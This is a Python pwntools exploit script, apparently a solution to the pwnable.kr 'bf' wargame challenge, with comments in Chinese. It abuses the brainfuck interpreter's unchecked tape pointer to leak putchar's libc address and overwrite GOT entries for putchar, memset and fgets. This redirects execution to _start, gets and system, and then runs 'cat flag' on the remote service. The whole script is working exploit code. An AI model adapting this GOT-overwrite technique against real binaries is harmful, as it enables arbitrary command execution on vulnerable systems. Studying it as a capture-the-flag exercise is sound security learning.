# -*-coding: utf-8 -*-
from pwn import *

e = ELF("bf")

addr_start	= e.symbols["_start"]	# 0x080484E0
got_fgets	= e.got["fgets"]		# 0x0804A010
got_memset	= e.got["memset"]		# 0x0804A02C
got_putchar	= e.got["putchar"]		# 0x0804A030
addr_tape	= e.symbols["tape"]		# 0x0804A0A0

libc = ELF("bf_libc.so")

off_system	= libc.symbols["system"]		# 0x0003F0B0
off_gets	= libc.symbols["gets"]			# 0x00065E90
off_putchar	= libc.symbols["putchar"]		# 0x000677D0

p_add = ">"
p_sub = "<"
rd = "."
wt = ","

payload = ""

payload += p_sub * (addr_tape - got_putchar)		# 使p的值变成got_putchar
payload += rd										# 调用putchar，那么[got_putchar]就变成了putchar的地址
payload += (rd + p_add) * 4							# 读取putchar地址，即[got_putchar]
payload += p_sub * 4								# 由于上面的读操作，使p的值变成了got_putchar + 4，现在调整p，使p的值变成got_putchar
payload += (wt + p_add) * 4							# 修改[got_putchar]，使其变为addr_start
payload += p_sub * 4								# 由于上面的写操作，使p的值变成了got_putchar + 4，现在调整p，使p的值变成got_putchar

payload += p_sub * (got_putchar - got_memset) 		# 使p的值变成got_memset
payload += (wt + p_add) * 4							# 修改[got_memset]，使其变为gets的地址
payload += p_sub * 4								# 由于上面的写操作，使p的值变成了got_memset + 4，现在调整p，使p的值变成got_memset

payload += p_sub * (got_memset - got_fgets) 		# 使p的值变成got_fgets
payload += (wt + p_add) * 4							# 修改[got_fgets]，使其变为system的地址

payload += rd										# 触发putchar，实际调用的是_start函数

r = remote("pwnable.kr", 9001)
r.recvline_startswith("type")
r.sendline(payload)
r.recvn(1)
addr_putchar = u32(r.recvn(4))
libc_base_addr = addr_putchar - off_putchar
r.send(p32(addr_start))
addr_gets = libc_base_addr + off_gets
r.send(p32(addr_gets))
add_system = libc_base_addr + off_system
r.send(p32(add_system))
r.recvline_startswith("type")
r.sendline("cat flag")
print r.recvall()
